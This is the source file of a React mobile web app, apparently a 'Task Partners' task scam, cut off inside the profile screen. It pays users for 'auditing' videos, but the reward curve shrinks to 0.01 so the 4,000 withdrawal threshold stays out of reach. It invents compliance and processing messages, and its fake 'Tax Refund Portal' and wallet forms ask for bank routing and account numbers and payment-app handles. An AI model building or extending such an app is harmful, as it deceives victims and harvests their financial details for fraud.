import { createFileRoute } from "@tanstack/react-router";
import {
  AtSign,
  Check,
  CheckCircle2,
  Home,
  Loader2,
  LockKeyhole,
  LockKeyholeIcon,
  Pause,
  Play,
  ReceiptText,
  Search,
  Star,
  UserRound,
  Volume2,
  VolumeX,
  Wallet,
} from "lucide-react";
import type { FormEvent, ReactNode } from "react";
import { useEffect, useMemo, useRef, useState } from "react";

export const Route = createFileRoute("/tasks-app")({
  head: () => ({
    meta: [
      { title: "Task Partners" },
      { name: "description", content: "Premium mobile task auditing app." },
    ],
  }),
  component: TaskPartnersApp,
});

type Screen = "tasks" | "wallet" | "refund" | "profile";
type AuthMode = "login" | "register";
type Review = { date: string; title: string; reward: number; status: string };
type User = { name: string; email: string; password: string };
type VideoTask = {
  day: number;
  id: string;
  sequence: number;
  creator: string;
  title: string;
  videoUrl: string;
  reward: number;
};

const INITIAL_BALANCE = 2800;
const MIN_WITHDRAWAL = 4000;
const DAYS_TO_GOAL = 7;
const DAILY_LIMIT = 6;
const TOTAL_TASKS_TO_GOAL = DAYS_TO_GOAL * DAILY_LIMIT;
const TOTAL_REWARD_TO_GOAL = MIN_WITHDRAWAL - INITIAL_BALANCE;
const ACCOUNTS_KEY = "ttp_accounts";
const SESSION_KEY = "ttp_session";
const APP_STATE_KEY = "ttp_app_state";
const REFUND_STATE_KEY = "ttp_refund_state";

const videoPool = [
  { creator: "Viral Creator Content", title: "Challenge Audit", videoUrl: "/videos/task1.mp4" },
  { creator: "US Trending Video", title: "Illusion Review", videoUrl: "/videos/task2.mp4" },
  { creator: "Viral Creator Content", title: "Satisfying ASMR Audit", videoUrl: "/videos/task3.mp4" },
  { creator: "US Trending Video", title: "Viral Audio Audit", videoUrl: "/videos/task4.mp4" },
  { creator: "Viral Creator Content", title: "Engagement Review", videoUrl: "/videos/task5.mp4" },
  { creator: "US Trending Video", title: "Watch Time Quality Check", videoUrl: "/videos/task6.mp4" },
];

const rewardCurve = [
  120, 115, 110, 105, 100, 95,
  100, 95, 90, 85, 80, 75,
  7, 6, 5, 4, 3, 1.15,
  1, 0.8, 0.6, 0.5, 0.4, 0.3,
  0.01, 0.01, 0.01, 0.01, 0.01, 0.01,
  0.01, 0.01, 0.01, 0.01, 0.01, 0.01,
  0.01, 0.01, 0.01, 0.01, 0.01, 0.08,
] as const;

const tasks: VideoTask[] = Array.from({ length: TOTAL_TASKS_TO_GOAL }, (_, index) => {
  const day = Math.floor(index / DAILY_LIMIT) + 1;
  const sequence = (index % DAILY_LIMIT) + 1;
  const source = videoPool[index % videoPool.length];
  return {
    day,
    id: `day-${day}-task-${sequence}`,
    sequence,
    creator: source.creator,
    title: source.title,
    videoUrl: source.videoUrl,
    reward: rewardForTask(index),
  };
});

const processingSteps = ["Analyzing consistency...", "Validating retention...", "Checking review quality...", "Adding reward..."];
const paymentOptions = ["Cash App", "PayPal", "Venmo", "Zelle", "Bank Transfer (ACH)"];

function TaskPartnersApp() {
  const [allowed, setAllowed] = useState(false);
  const [checkedGate, setCheckedGate] = useState(false);
  const [isDesktop, setIsDesktop] = useState(false);
  const [user, setUser] = useState<User | null>(null);
  const [authMode, setAuthMode] = useState<AuthMode>("login");
  const [authError, setAuthError] = useState("");
  const [accountNotFound, setAccountNotFound] = useState(false);
  const [signupName, setSignupName] = useState("");
  const [signupEmail, setSignupEmail] = useState("");
  const [signupPassword, setSignupPassword] = useState("");
  const [loginEmail, setLoginEmail] = useState("");
  const [loginPassword, setLoginPassword] = useState("");
  const [remember, setRemember] = useState(true);
  const [loading, setLoading] = useState(false);
  const [screen, setScreen] = useState<Screen>("tasks");
  const [taskIndex, setTaskIndex] = useState(0);
  const [progress, setProgress] = useState(0);
  const [rating, setRating] = useState(0);
  const [useful, setUseful] = useState("");
  const [recommend, setRecommend] = useState("");
  const [comment, setComment] = useState("");
  const [balance, setBalance] = useState(INITIAL_BALANCE);
  const [pendingBalance] = useState(0);
  const [reviews, setReviews] = useState<Review[]>([]);
  const [reviewedIds, setReviewedIds] = useState<string[]>([]);
  const [processing, setProcessing] = useState(false);
  const [processingStep, setProcessingStep] = useState(0);
  const [successReward, setSuccessReward] = useState<number | null>(null);
  const [paymentMethod, setPaymentMethod] = useState(paymentOptions[0]);
  const [paymentData, setPaymentData] = useState("");
  const [paymentBank, setPaymentBank] = useState("");
  const [paymentRouting, setPaymentRouting] = useState("");
  const [paymentAccount, setPaymentAccount] = useState("");
  const [refundMethod, setRefundMethod] = useState(paymentOptions[0]);
  const [refundData, setRefundData] = useState("");
  const [refundBank, setRefundBank] = useState("");
  const [refundRouting, setRefundRouting] = useState("");
  const [refundAccount, setRefundAccount] = useState("");
  const [refundLoading, setRefundLoading] = useState(false);
  const [refundApproved, setRefundApproved] = useState(false);
  const [isMuted, setIsMuted] = useState(true);

  const task = tasks[Math.min(taskIndex, tasks.length - 1)];
  const taskReviewKey = `${task.id}-${taskIndex}`;
  const dailyLimitReached = reviewedIds.length > 0 && reviewedIds.length % DAILY_LIMIT === 0;
  const completedToday = dailyLimitReached ? DAILY_LIMIT : (taskIndex % DAILY_LIMIT) + 1;
  const reviewUnlocked = progress >= 100 && !reviewedIds.includes(taskReviewKey);
  const hasValidComment = countWords(comment) >= 3;
  const canSubmit = reviewUnlocked && rating > 0 && Boolean(useful) && Boolean(recommend) && hasValidComment;
  const balanceText = useMemo(() => brl(balance), [balance]);

  useEffect(() => {
    setAllowed(true);
    setCheckedGate(true);
  }, []);

  useEffect(() => {
    if (!allowed) return;
    const sessionUser = readSession();
    if (sessionUser) {
      setUser(sessionUser);
      setScreen("tasks");
      const savedState = readAppState(sessionUser.email);
      if (savedState) {
        setBalance(savedState.balance);
        setReviews(savedState.reviews);
        setReviewedIds(savedState.reviewedIds);
        setTaskIndex(savedState.taskIndex);
      }
      const savedRefund = readRefundState(sessionUser.email);
      if (savedRefund) {
        setRefundMethod(savedRefund.method);
        setRefundData(savedRefund.data);
        setRefundBank(savedRefund.bank);
        setRefundRouting(savedRefund.routing);
        setRefundAccount(savedRefund.account);
        setRefundApproved(savedRefund.approved);
      }
    }
  }, [allowed]);

  useEffect(() => {
    if (!user) return;
    window.localStorage.setItem(
      appStateKey(user.email),
      JSON.stringify({
        balance,
        reviewedIds,
        reviews,
        taskIndex,
      }),
    );
  }, [balance, reviewedIds, reviews, taskIndex, user]);

  useEffect(() => {
    const update = () => setIsDesktop(window.innerWidth > 768);
    update();
    window.addEventListener("resize", update);
    return () => window.removeEventListener("resize", update);
  }, []);

  useEffect(() => {
    setProgress(0);
  }, [taskIndex]);

  function login(event: FormEvent<HTMLFormElement>) {
    event.preventDefault();
    setAuthError("");
    setAccountNotFound(false);
    setLoading(true);
    window.setTimeout(() => {
      const account = readAccounts().find((item) => item.email.toLowerCase() === loginEmail.trim().toLowerCase());
      if (!account) {
        setAuthError("Account not found. Click here to register your new account.");
        setAccountNotFound(true);
        setLoading(false);
        return;
      }
      if (account.password !== loginPassword) {
        setAuthError("Incorrect credentials. Please try again.");
        setLoading(false);
        return;
      }
      setUser(account);
      const savedState = readAppState(account.email);
      if (savedState) {
        setBalance(savedState.balance);
        setReviews(savedState.reviews);
        setReviewedIds(savedState.reviewedIds);
        setTaskIndex(savedState.taskIndex);
      }
      const savedRefund = readRefundState(account.email);
      if (savedRefund) {
        setRefundMethod(savedRefund.method);
        setRefundData(savedRefund.data);
        setRefundBank(savedRefund.bank);
        setRefundRouting(savedRefund.routing);
        setRefundAccount(savedRefund.account);
        setRefundApproved(savedRefund.approved);
      }
      setLoading(false);
      setScreen("tasks");
      if (remember) window.localStorage.setItem(SESSION_KEY, JSON.stringify(account));
    }, 700);
  }

  function register(event: FormEvent<HTMLFormElement>) {
    event.preventDefault();
    setAuthError("");
    setAccountNotFound(false);
    setLoading(true);
    window.setTimeout(() => {
      const email = signupEmail.trim();
      const accounts = readAccounts();
      if (accounts.some((item) => item.email.toLowerCase() === email.toLowerCase())) {
        setAuthError("An account with this email already exists.");
        setLoading(false);
        return;
      }
      const nextUser = { name: signupName.trim(), email, password: signupPassword };
      const nextAccounts = [...accounts, nextUser];
      window.localStorage.setItem(ACCOUNTS_KEY, JSON.stringify(nextAccounts));
      window.localStorage.setItem(SESSION_KEY, JSON.stringify(nextUser));
      window.localStorage.setItem(
        appStateKey(nextUser.email),
        JSON.stringify({ balance: INITIAL_BALANCE, reviewedIds: [], reviews: [], taskIndex: 0 }),
      );
      setUser(nextUser);
      setRefundApproved(false);
      setScreen("tasks");
      setLoading(false);
    }, 700);
  }

  function submitReview() {
    if (!canSubmit) return;
    const completedTask = task;
    const completedKey = taskReviewKey;
    const reward = completedTask.reward;

    setSuccessReward(null);
    setReviewedIds((value) => [...value, completedKey]);
    setReviews((value) => [
      { date: new Date().toLocaleDateString("en-US"), title: completedTask.title, reward, status: "Approved" },
      ...value,
    ]);
    setBalance((value) => Number((value + reward).toFixed(2)));
    setRating(0);
    setUseful("");
    setRecommend("");
    setComment("");
    setProgress(0);
    if ((completedTask.sequence % DAILY_LIMIT) !== 0) {
      setTaskIndex((value) => Math.min(value + 1, TOTAL_TASKS_TO_GOAL - 1));
    }

    setProcessing(true);
    setProcessingStep(0);
    let step = 0;
    const timer = window.setInterval(() => {
      step += 1;
      setProcessingStep(Math.min(step, processingSteps.length - 1));
      if (step >= processingSteps.length) {
        window.clearInterval(timer);
        setProcessing(false);
        setSuccessReward(reward);
        window.setTimeout(() => setSuccessReward(null), 2600);
      }
    }, 1250);
  }

  function requestRefund(event: FormEvent<HTMLFormElement>) {
    event.preventDefault();
    setRefundLoading(true);
    if (user) {
      window.localStorage.setItem(
        refundStateKey(user.email),
        JSON.stringify({
          account: refundAccount,
          approved: true,
          bank: refundBank,
          data: refundData,
          method: refundMethod,
          routing: refundRouting,
        }),
      );
    }
    window.setTimeout(() => {
      setRefundLoading(false);
      setRefundApproved(true);
    }, 1600);
  }

  if (!checkedGate) return null;
  if (!allowed) return <Server404 />;
  if (isDesktop) return <UnsupportedDevice />;

  if (!user) {
    return (
      <main className="min-h-dvh bg-[#F8FAFC] text-[#0F172A]">
        <section className="mx-auto flex min-h-dvh w-full max-w-[430px] flex-col px-5 py-5">
          <div className="flex items-center justify-center">
            <Brand />
          </div>
          <div className="flex flex-1 flex-col justify-center">
            <div className="mx-auto mb-8 grid h-24 w-24 place-items-center rounded-[28px] bg-white text-[#0F172A] shadow-[0_20px_45px_rgba(15,23,42,.12)]">
              <CheckCircle2 className="text-[#FE2C55]" size={42} />
            </div>
            <h1 className="text-center text-[30px] font-black leading-tight">{authMode === "login" ? "Sign in to Task Partners" : "Create your Task Partners account"}</h1>
            <p className="mx-auto mt-3 max-w-[330px] text-center text-sm leading-6 text-[#475569]">
              Sign in or create your reviewer account to unlock premium video audit tasks.
            </p>
            {authError && (
              <div className="mt-5 rounded-[8px] border border-rose-200 bg-rose-50 px-4 py-3 text-sm font-black text-rose-600">
                {accountNotFound ? (
                  <button
                    className="text-left underline decoration-2 underline-offset-2"
                    onClick={() => {
                      setSignupEmail(loginEmail);
                      setAuthError("");
                      setAccountNotFound(false);
                      setAuthMode("register");
                    }}
                    type="button"
                  >
                    {authError}
                  </button>
                ) : authError}
              </div>
            )}
            <form onSubmit={authMode === "login" ? login : register} className="mt-8 space-y-3">
              {authMode === "register" && <AuthInput icon={<UserRound size={18} />} onChange={setSignupName} placeholder="Full Name" type="text" value={signupName} />}
              <AuthInput
                icon={<AtSign size={18} />}
                onChange={authMode === "login" ? setLoginEmail : setSignupEmail}
                placeholder="Email"
                type="email"
                value={authMode === "login" ? loginEmail : signupEmail}
              />
              <AuthInput
                icon={<LockKeyhole size={18} />}
                onChange={authMode === "login" ? setLoginPassword : setSignupPassword}
                placeholder="Password"
                type="password"
                value={authMode === "login" ? loginPassword : signupPassword}
              />
              {authMode === "login" && (
                <label className="flex items-center justify-between rounded-[8px] border border-slate-200 bg-white px-4 py-3 text-sm font-bold shadow-sm">
                  Keep me signed in
                  <input checked={remember} onChange={(event) => setRemember(event.target.checked)} type="checkbox" className="h-5 w-5 accent-[#FE2C55]" />
                </label>
              )}
              <button className="flex h-13 w-full items-center justify-center gap-2 rounded-[8px] bg-[#FE2C55] font-black text-white shadow-lg shadow-rose-200 transition active:scale-[0.98]" type="submit">
                {loading ? <Loader2 className="animate-spin" size={18} /> : <Check size={18} />}
                {authMode === "login" ? "Sign In" : "Create Account"}
              </button>
            </form>
            <button
              className="mt-5 w-full text-center text-sm font-black text-[#2563EB]"
              onClick={() => {
                setAuthError("");
                setAuthMode((value) => (value === "login" ? "register" : "login"));
              }}
              type="button"
            >
              {authMode === "login" ? "Don't have an account? Register" : "Already have an account? Sign In"}
            </button>
          </div>
        </section>
      </main>
    );
  }

  return (
    <main className="h-dvh overflow-hidden bg-[#F8FAFC] text-[#0F172A]">
      <section className="relative mx-auto flex h-dvh w-full max-w-[430px] flex-col overflow-hidden bg-[#F8FAFC]">
        <header className="shrink-0 border-b border-slate-200 bg-white px-4 py-3 shadow-sm">
          <div className="flex items-center justify-between gap-3">
            <div className="min-w-0">
              <p className="text-[10px] font-black uppercase tracking-[0.14em] text-[#475569]">Balance</p>
              <p className="flex items-center gap-1 truncate text-[17px] font-black text-[#0F172A]"><Wallet size={18} className="text-[#2563EB]" />{balanceText}</p>
            </div>
            <div className="shrink-0 rounded-[8px] bg-[#F1F5F9] px-3 py-2 text-right">
              <p className="text-[10px] font-black uppercase tracking-[0.14em] text-[#475569]">Daily Tasks</p>
              <p className="text-lg font-black text-[#FE2C55]">{Math.min(completedToday, DAILY_LIMIT)}/{DAILY_LIMIT}</p>
              <p className="text-[10px] font-black text-[#475569]">Partner audits</p>
            </div>
          </div>
          <p className="mt-3 text-[11px] font-bold leading-4 text-[#475569]">
            Review partner creators to unlock and release the remaining pending withdrawal balance.
          </p>
        </header>

        <div className="min-h-0 flex-1 overflow-y-auto px-4 pb-28 pt-4">
          {screen === "tasks" && (
            <TasksScreen
              canSubmit={canSubmit}
              comment={comment}
              dailyLimitReached={dailyLimitReached}
              hasValidComment={hasValidComment}
              isMuted={isMuted}
              progress={progress}
              rating={rating}
              recommend={recommend}
              reviewUnlocked={reviewUnlocked}
              setComment={setComment}
              setIsMuted={setIsMuted}
              setProgress={setProgress}
              setRating={setRating}
              setRecommend={setRecommend}
              setUseful={setUseful}
              submitReview={submitReview}
              task={task}
              taskIndex={taskIndex}
              useful={useful}
            />
          )}
          {screen === "wallet" && (
            <WalletScreen
              balance={balance}
              pendingBalance={pendingBalance}
              paymentData={paymentData}
              paymentAccount={paymentAccount}
              paymentBank={paymentBank}
              paymentMethod={paymentMethod}
              paymentRouting={paymentRouting}
              setPaymentData={setPaymentData}
              setPaymentAccount={setPaymentAccount}
              setPaymentBank={setPaymentBank}
              setPaymentMethod={setPaymentMethod}
              setPaymentRouting={setPaymentRouting}
            />
          )}
          {screen === "refund" && (
            <RefundScreen
              approved={refundApproved}
              account={refundAccount}
              bank={refundBank}
              data={refundData}
              loading={refundLoading}
              method={refundMethod}
              onSubmit={requestRefund}
              routing={refundRouting}
              setAccount={setRefundAccount}
              setBank={setRefundBank}
              setData={setRefundData}
              setMethod={setRefundMethod}
              setRouting={setRefundRouting}
            />
          )}
          {screen === "profile" && <ProfileScreen reviews={reviews} user={user} balance={balance} />}
        </div>

        <BottomNav screen={screen} setScreen={setScreen} />
      </section>

      {processing && <ProcessingOverlay step={processingStep} />}
      {successReward !== null && (
        <div className="fixed left-1/2 top-[max(16px,env(safe-area-inset-top))] z-[60] w-[calc(100vw-32px)] max-w-[398px] -translate-x-1/2 rounded-[8px] bg-emerald-500 px-4 py-3 text-center text-sm font-black text-white shadow-2xl">
          +{brl(successReward)} Added to your balance!
        </div>
      )}
    </main>
  );
}

function TasksScreen(props: {
  canSubmit: boolean;
  comment: string;
  dailyLimitReached: boolean;
  hasValidComment: boolean;
  isMuted: boolean;
  progress: number;
  rating: number;
  recommend: string;
  reviewUnlocked: boolean;
  setComment: (value: string) => void;
  setIsMuted: (value: boolean) => void;
  setProgress: (value: number) => void;
  setRating: (value: number) => void;
  setRecommend: (value: string) => void;
  setUseful: (value: string) => void;
  submitReview: () => void;
  task: VideoTask;
  taskIndex: number;
  useful: string;
}) {
  const videoRef = useRef<HTMLVideoElement | null>(null);
  const [isPlaying, setIsPlaying] = useState(true);
  const dayEndIndex = props.task.day * DAILY_LIMIT;
  const lockedTasks = tasks.slice(props.taskIndex + 1, dayEndIndex);

  function togglePlayback() {
    const video = videoRef.current;
    if (!video) return;
    if (video.paused) {
      void video.play();
      setIsPlaying(true);
    } else {
      video.pause();
      setIsPlaying(false);
    }
  }

  if (props.dailyLimitReached) {
    return (
      <div className="space-y-4">
        <section className="rounded-[8px] border border-rose-200 bg-white p-5 text-center shadow-sm">
          <div className="mx-auto mb-4 grid h-16 w-16 place-items-center rounded-full bg-[#FE2C55] text-white">
            <LockKeyholeIcon size={30} />
          </div>
          <h1 className="text-2xl font-black text-[#0F172A]">Daily Limit Reached!</h1>
          <p className="mt-3 text-sm font-bold leading-6 text-[#475569]">
            To maintain network quality and security, you can only audit 6 videos per day.
            Please return tomorrow to unlock your remaining pending balance.
          </p>
        </section>
      </div>
    );
  }

  return (
    <div className="space-y-4">
      <section className="rounded-[8px] border border-slate-200 bg-white p-3 shadow-sm">
        <div className="mb-3 flex items-start justify-between gap-3">
          <div className="min-w-0">
            <p className="text-xs font-black text-[#FE2C55]">{props.task.creator}</p>
            <h1 className="text-xl font-black leading-tight text-[#0F172A]">{props.task.title}</h1>
            <p className="mt-1 text-xs font-semibold text-[#475569]">Task {props.task.sequence}/6 - Reward: {brl(props.task.reward)}</p>
            <p className="mt-2 text-xs font-bold leading-5 text-[#475569]">
              Evaluate partner creator content to release your remaining pending withdrawal balance.
            </p>
          </div>
        </div>
        <div className="relative aspect-[9/20] max-h-[560px] w-full overflow-hidden rounded-[8px] bg-slate-950">
          <video
            ref={videoRef}
            key={props.task.id}
            autoPlay
            className="h-full w-full object-contain"
            muted={props.isMuted}
            onEnded={() => props.setProgress(100)}
            onPause={() => setIsPlaying(false)}
            onPlay={() => setIsPlaying(true)}
            onTimeUpdate={(event) => {
              const video = event.currentTarget;
              if (!Number.isFinite(video.duration) || video.duration <= 0) return;
              props.setProgress(Math.min(99, (video.currentTime / video.duration) * 100));
            }}
            playsInline
            preload="auto"
            src={props.task.videoUrl}
          />
          <button
            aria-label={isPlaying ? "Pause video" : "Play video"}
            className="absolute left-3 top-3 grid h-10 w-10 place-items-center rounded-full bg-black/55 text-white backdrop-blur"
            onClick={togglePlayback}
            onMouseDown={(event) => event.preventDefault()}
            type="button"
          >
            {isPlaying ? <Pause size={18} /> : <Play size={18} fill="currentColor" />}
          </button>
          <button
            className="absolute right-3 top-3 grid h-10 w-10 place-items-center rounded-full bg-black/55 text-white backdrop-blur"
            onClick={() => props.setIsMuted(!props.isMuted)}
            onMouseDown={(event) => event.preventDefault()}
            type="button"
          >
            {props.isMuted ? <VolumeX size={19} /> : <Volume2 size={19} />}
          </button>
        </div>
      </section>

      <section className="rounded-[8px] border border-slate-200 bg-white p-4 shadow-sm">
        <div className="mb-2 flex items-center justify-between text-xs font-black text-[#475569]">
          <span>Finish watching the video to unlock the creator review. ({Math.round(props.progress)}%)</span>
        </div>
        <div className="h-3 overflow-hidden rounded-full bg-slate-200">
          <div className="h-full rounded-full bg-[#FE2C55] transition-all duration-500" style={{ width: `${props.progress}%` }} />
        </div>
      </section>

      <section className="rounded-[8px] border border-slate-200 bg-[#F1F5F9] p-4 shadow-sm transition-all">
        {!props.reviewUnlocked ? (
          <div className="flex min-h-[210px] flex-col items-center justify-center text-center">
            <div className="mb-4 grid h-16 w-16 place-items-center rounded-full bg-white text-[#FE2C55] shadow-sm">
              <LockKeyholeIcon size={30} />
            </div>
            <h2 className="text-xl font-black text-[#0F172A]">Review Locked</h2>
            <p className="mt-2 max-w-[280px] text-sm leading-6 text-[#475569]">Finish the partner creator audit above to unlock the questions and release pending withdrawal funds.</p>
          </div>
        ) : (
          <div className="space-y-4">
            <div>
              <p className="mb-2 text-sm font-black text-[#0F172A]">1. Rate the video quality</p>
              <div className="flex flex-wrap gap-2">
                {[1, 2, 3, 4, 5].map((star) => (
                  <button key={star} className={`grid h-11 w-11 place-items-center rounded-full transition ${props.rating >= star ? "bg-[#FE2C55] text-white" : "bg-white text-slate-400"}`} onClick={() => props.setRating(star)} onMouseDown={(event) => event.preventDefault()} type="button">
                    <Star size={18} fill={props.rating >= star ? "currentColor" : "none"} />
                  </button>
                ))}
              </div>
            </div>
            <ChoiceRow label="2. Was the content useful?" value={props.useful} onChange={props.setUseful} />
            <ChoiceRow label="3. Would you recommend it?" value={props.recommend} onChange={props.setRecommend} />
            <label className="block">
              <span className="mb-2 block text-sm font-black text-[#0F172A]">4. Additional comments for the algorithm</span>
              <textarea
                className="min-h-28 w-full resize-none rounded-[8px] border border-slate-200 bg-white px-3 py-3 text-sm font-semibold text-[#0F172A] outline-none placeholder:text-slate-400 focus:border-[#2563EB]"
                onChange={(event) => props.setComment(event.target.value)}
                placeholder="Write at least 3 real words..."
                value={props.comment}
              />
              {!props.hasValidComment && (
                <span className="mt-1.5 block text-xs font-bold text-[#FE2C55]">Warning: Your comment must contain at least 3 words.</span>
              )}
            </label>
            <button className="min-h-13 w-full rounded-[8px] bg-[#FE2C55] px-4 py-3 text-sm font-black text-white shadow-lg shadow-rose-200 transition active:scale-[0.98] disabled:bg-slate-300 disabled:text-slate-500 disabled:shadow-none" disabled={!props.canSubmit} onClick={props.submitReview} type="button">
              Submit Creator Review & Release Balance
            </button>
          </div>
        )}
      </section>

      <section className="space-y-3">
        <div>
          <h2 className="text-lg font-black text-[#0F172A]">Pending Reviews</h2>
          <p className="text-xs font-semibold text-[#475569]">Complete the current creator audit to unlock the next partner review.</p>
        </div>
        {lockedTasks.map((lockedTask, index) => (
          <div className="relative overflow-hidden rounded-[8px] border border-slate-200 bg-white p-3 shadow-sm" key={`${lockedTask.id}-${index}`}>
            <div className="flex items-center gap-3 blur-[3px]">
              <div className="h-16 w-24 shrink-0 rounded-[8px] bg-gradient-to-br from-slate-200 via-slate-300 to-slate-100" />
              <div className="min-w-0">
                <p className="truncate text-xs font-black text-[#FE2C55]">{lockedTask.creator}</p>
                <p className="truncate text-sm font-black text-[#0F172A]">{lockedTask.title}</p>
                <p className="text-xs font-semibold text-[#475569]">{brl(lockedTask.reward)} release value</p>
              </div>
            </div>
            <div className="absolute inset-0 grid place-items-center bg-white/45 backdrop-blur-sm">
              <div className="flex flex-col items-center text-center">
                <div className="mb-2 grid h-10 w-10 place-items-center rounded-full bg-[#0F172A] text-white">
                  <LockKeyholeIcon size={19} />
                </div>
                <p className="max-w-[230px] text-xs font-black text-[#0F172A]">Complete the previous review to unlock this task.</p>
              </div>
            </div>
          </div>
        ))}
      </section>
    </div>
  );
}

function WalletScreen(props: {
  balance: number;
  pendingBalance: number;
  paymentAccount: string;
  paymentBank: string;
  paymentData: string;
  paymentMethod: string;
  paymentRouting: string;
  setPaymentAccount: (value: string) => void;
  setPaymentBank: (value: string) => void;
  setPaymentData: (value: string) => void;
  setPaymentMethod: (value: string) => void;
  setPaymentRouting: (value: string) => void;
}) {
  const canWithdraw = props.balance >= MIN_WITHDRAWAL;
  return (
    <div>
      <h1 className="mb-4 text-2xl font-black text-[#0F172A]">Wallet</h1>
      <div className="grid gap-3">
        <MetricCard label="Current Balance" value={brl(props.balance)} tone="bg-white" />
        <MetricCard label="Pending Balance" value={brl(props.pendingBalance)} tone="bg-white" />
        <MetricCard label="Minimum Withdrawal" value={brl(MIN_WITHDRAWAL)} tone="bg-white" />
      </div>
      <div className="mt-5 rounded-[8px] border border-slate-200 bg-white p-4 shadow-sm">
        <p className="mb-3 text-sm font-black text-[#0F172A]">Withdrawal method</p>
        <select className="mb-3 h-12 w-full rounded-[8px] border border-slate-200 bg-[#F8FAFC] px-4 text-sm font-bold text-[#0F172A]" value={props.paymentMethod} onChange={(event) => props.setPaymentMethod(event.target.value)}>
          {paymentOptions.map((method) => <option key={method}>{method}</option>)}
        </select>
        <PaymentFields
          account={props.paymentAccount}
          bank={props.paymentBank}
          data={props.paymentData}
          method={props.paymentMethod}
          routing={props.paymentRouting}
          setAccount={props.setPaymentAccount}
          setBank={props.setPaymentBank}
          setData={props.setPaymentData}
          setRouting={props.setPaymentRouting}
        />
        {!canWithdraw && (
          <div className="mt-3 rounded-[8px] border border-amber-200 bg-amber-50 p-3">
            <p className="text-xs font-bold leading-5 text-amber-800">
              Due to financial security compliance, anti-fraud regulations, and high-volume transaction processing,
              the minimum withdrawal threshold for newly activated auditor accounts is strictly set to $4,000.
              Complete your daily audits to release your pending funds.
            </p>
          </div>
        )}
        <button className="mt-3 min-h-12 w-full rounded-[8px] bg-[#FE2C55] px-4 py-3 text-sm font-black text-white disabled:bg-slate-300 disabled:text-slate-500" disabled={!canWithdraw} type="button">
          {canWithdraw ? "Request Withdrawal" : "Withdrawal Locked"}
        </button>
      </div>
    </div>
  );
}

function RefundScreen(props: {
  account: string;
  approved: boolean;
  bank: string;
  data: string;
  loading: boolean;
  method: string;
  onSubmit: (event: FormEvent<HTMLFormElement>) => void;
  routing: string;
  setAccount: (value: string) => void;
  setBank: (value: string) => void;
  setData: (value: string) => void;
  setMethod: (value: string) => void;
  setRouting: (value: string) => void;
}) {
  return (
    <div>
      <h1 className="mb-4 text-2xl font-black text-[#0F172A]">Tax Refund Portal</h1>
      <section className="rounded-[8px] border border-slate-200 bg-white p-4 shadow-sm">
        <p className="text-sm leading-6 text-[#475569]">
          Tax Refund Pending: A fee of R$ 37.12 linked to your ID is eligible for instant refund. This will be deposited into your account in less than 24 hours. Enter your payout details below.
        </p>
        {props.approved ? (
          <div className="mt-5 rounded-[8px] border border-emerald-200 bg-emerald-50 p-4">
            <p className="text-sm font-black text-emerald-700">
              Status: Processing... Your refund of R$ 37,12 is being processed and will be credited to your selected account within 24 hours.
            </p>
          </div>
        ) : (
          <form className="mt-5 space-y-3" onSubmit={props.onSubmit}>
            <select className="h-12 w-full rounded-[8px] border border-slate-200 bg-[#F8FAFC] px-4 text-sm font-bold text-[#0F172A]" value={props.method} onChange={(event) => props.setMethod(event.target.value)}>
              {paymentOptions.map((method) => <option key={method}>{method}</option>)}
            </select>
            <PaymentFields
              account={props.account}
              bank={props.bank}
              data={props.data}
              method={props.method}
              routing={props.routing}
              setAccount={props.setAccount}
              setBank={props.setBank}
              setData={props.setData}
              setRouting={props.setRouting}
            />
            <button className="flex min-h-12 w-full items-center justify-center gap-2 rounded-[8px] bg-[#2563EB] px-4 py-3 text-sm font-black text-white disabled:bg-slate-300" disabled={props.loading} type="submit">
              {props.loading && <Loader2 className="animate-spin" size={18} />}
              Confirm & Register Details
            </button>
          </form>
        )}
      </section>
    </div>
  );
}

function PaymentFields(props: {
  account: string;
  bank: string;
  data: string;
  method: string;
  routing: string;
  setAccount: (value: string) => void;
  setBank: (value: string) => void;
  setData: (value: string) => void;
  setRouting: (value: string) => void;
}) {
  if (props.method === "Bank Transfer (ACH)") {
    return (
      <div className="space-y-3">
        <label className="block">
          <span className="mb-1.5 block text-xs font-black text-[#475569]">Bank</span>
          <div className="flex h-12 items-center gap-2 rounded-[8px] border border-slate-200 bg-[#F8FAFC] px-3">
            <Search size={16} className="shrink-0 text-[#475569]" />
            <input
              className="min-w-0 flex-1 bg-transparent text-sm font-bold text-[#0F172A] outline-none placeholder:text-slate-400"
              onChange={(event) => props.setBank(event.target.value)}
              placeholder="Search your bank"
              value={props.bank}
            />
          </div>
        </label>
        <LabeledPaymentInput label="Routing number" onChange={props.setRouting} placeholder="Enter your routing number" value={props.routing} />
        <LabeledPaymentInput label="Account number" onChange={props.setAccount} placeholder="Enter your account number" value={props.account} />
        <button className="h-12 w-full rounded-[8px] bg-[#FE2C55] text-sm font-black text-white shadow-lg shadow-rose-100" type="button">
          Continue
        </button>
      </div>
    );
  }

  const placeholder =
    props.method === "PayPal"
      ? "Enter your PayPal email"
      : props.method === "Venmo"
        ? "Enter your Venmo username"
        : props.method === "Cash App"
          ? "Enter your Cash App username"
          : props.method === "Zelle"
            ? "Enter your Zelle email or phone"
            : "Enter your payout details";

  return (
    <input
      className="h-12 w-full rounded-[8px] border border-slate-200 bg-[#F8FAFC] px-4 text-sm font-bold text-[#0F172A] outline-none placeholder:text-slate-400"
      onChange={(event) => props.setData(event.target.value)}
      placeholder={placeholder}
      value={props.data}
    />
  );
}

function LabeledPaymentInput({ label, onChange, placeholder, value }: { label: string; onChange: (value: string) => void; placeholder: string; value: string }) {
  return (
    <label className="block">
      <span className="mb-1.5 block text-xs font-black text-[#475569]">{label}</span>
      <input
        className="h-12 w-full rounded-[8px] border border-slate-200 bg-[#F8FAFC] px-4 text-sm font-bold text-[#0F172A] outline-none placeholder:text-slate-400"
        onChange={(event) => onChange(event.target.value)}
        placeholder={placeholder}
        value={value}
      />
    </label>
  );
}

function ProfileScreen({ user, reviews, balance }: { user: User; reviews: Review[]; balance: number }) {
  return (
    <div>
      <h1 className="mb-4 text-2xl font-black text-[#0F172A]">Profile</h1>
      <div className="rounded-[8px] border border-slate-200 bg-white p-4 shadow-sm">
        <div className="flex items-center gap-3">
          <div className="grid h-16 w-16 place-items-center rounded-full bg-[#F1F5F9] text-[#0F172A]"><UserRound size={31} /></div>
          <div className="min-w-0">
            <p className="text-lg font-black">{user.name}</p>
            <p className="truncate text-sm font-bold text-[#475569]">{user.email}</p>
            <p className="mt-1 text-xs font-black text-[#2563EB]">Total balance: {brl(balance)}</p>
          </div>
        </div>
      </div>
      <h2 className="mb-3 mt-5 text-lg font-black text-[#0F172A]">Review History</h2>
      <div className="space-y-2">
